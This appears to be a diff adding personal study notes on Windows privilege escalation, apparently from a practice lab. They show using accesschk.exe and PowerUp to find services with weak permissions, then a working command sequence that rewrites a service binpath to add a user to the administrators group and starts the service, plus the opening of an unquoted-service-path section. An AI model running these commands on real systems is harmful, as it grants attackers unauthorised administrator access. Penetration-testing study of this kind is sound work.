@@ -1,0 +1,51 @@
+
+Path Escalation Techniques : 
+
+1. Binary Path Escalation (binPath)
+
+tool used : here we can use accesschk.exe or powerUp.ps1
+
+1.1 accesschk.exe : 
+ 
+  accesschk.exe -uvwc Everyone * 
+	-u : used to ignore the error 
+	-v : for verbosity 
+	-w : wriatble path 
+	-c : Display the service name 
+
+	Everyone : everyone as a group 
+	
+ C:\PrivEsc>accesschk.exe -uwcv <service_name>
+ 
+Since we have permission to change configuration ( SERVICE_CHANGE_CONFIG )
+so we change the configuration of this file : 
+
+-> first we will query the service : 
+	sc qc <service_name>
+-> then modify the binpath : 
+	C:\PrivEsc>sc config daclsvc binpath="net localgroup administrators user /add "
+-> then run the service 
+	C:\PrivEsc>sc start daclsvc
+	
+
+1.2 PowerUp
+	. .\powerup.ps1
+	Invoke-AllChecks
+ex. 
+[*] Checking service permissions...
+
+
+ServiceName   : daclsvc
+Path          : "C:\Program Files\DACL Service\daclservice.exe"
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -ServiceName 'daclsvc'
+
+ 
+
+2. Unquoted Service Path 
+
+If you have a service executables whose path is not enclosed in the "" and contains the space 
+Tools used : PowerUp.ps1
+	. .\PowerUp.ps1
+	Invoke-AllChecks
+
